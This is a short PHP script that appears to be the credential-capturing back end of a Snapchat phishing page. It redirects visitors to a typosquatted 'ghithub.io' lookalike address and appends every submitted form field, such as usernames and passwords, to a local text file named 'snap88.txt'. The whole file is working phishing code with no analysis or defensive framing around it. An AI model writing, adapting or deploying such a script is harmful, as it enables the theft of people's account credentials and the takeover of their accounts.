<?php
header ('Location: https://add-snapchat-naif-alassaf-model-dubai.ghithub.io/model-Snapchat.com/welcome.html ');
$handle = fopen("snap88.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============\r\n");
fclose($handle);
exit;
?>